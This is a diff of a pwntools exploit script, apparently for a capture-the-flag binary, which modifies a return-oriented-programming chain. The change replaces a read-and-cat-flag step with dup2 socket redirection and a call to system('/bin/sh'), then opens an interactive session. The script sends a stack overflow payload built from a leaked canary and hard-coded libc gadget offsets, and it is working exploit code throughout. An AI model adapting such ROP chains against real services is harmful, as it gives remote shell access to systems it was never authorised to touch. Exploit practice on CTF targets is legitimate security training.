@@ -59,14 +59,13 @@ pop rdi ; ret                                                        ==> rdi = 4
 pop rsi ; ret                                                        ==> rsi = 1
 dup(4, 1)
 
-pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret ==> rdx = 0x200 & rax = 0
 pop rdi ; ret                                                        ==> rdi = 4
-pop rsi ; ret                                                        ==> rsi = 1
-read(4, buf, 0x200);
+pop rsi ; ret                                                        ==> rsi = 0
+dup(4, 0)
 
 ret                                                                  ==> for alignment
 pop rdi ; ret                                                        ==> rdi = ptr to command
-system(&cmd)
+system("/bin/sh\x00")
 """
 
 rop  = b''
@@ -77,13 +76,11 @@ rop += p64(libc.address + 0x110a7d)
 rop += p64(1)
 rop += p64(libc.sym.dup2)
 
-rop += p64(libc.address + 0xb503c)
-rop += p64(512) + p64(0)*4
 rop += p64(libc.address + 0x10f78b)
 rop += p64(4)
 rop += p64(libc.address + 0x110a7d)
-rop += p64(exe.address  + 0x4010)
-rop += p64(libc.sym.read)
+rop += p64(0)
+rop += p64(libc.sym.dup2)
 
 rop += p64(libc.address + 0x2882f)
 rop += p64(libc.address + 0x10f78b)
@@ -95,5 +92,4 @@ r.send(b"A"*0x100 + p64(0) + p64(canary) + p64(0) + rop)
 
 r.send(p64(0x2000))
 r.clean()
-r.send(b"cat /flag-*.txt\x00")
-print(r.recvall(timeout=1).strip().decode())
+r.interactive()
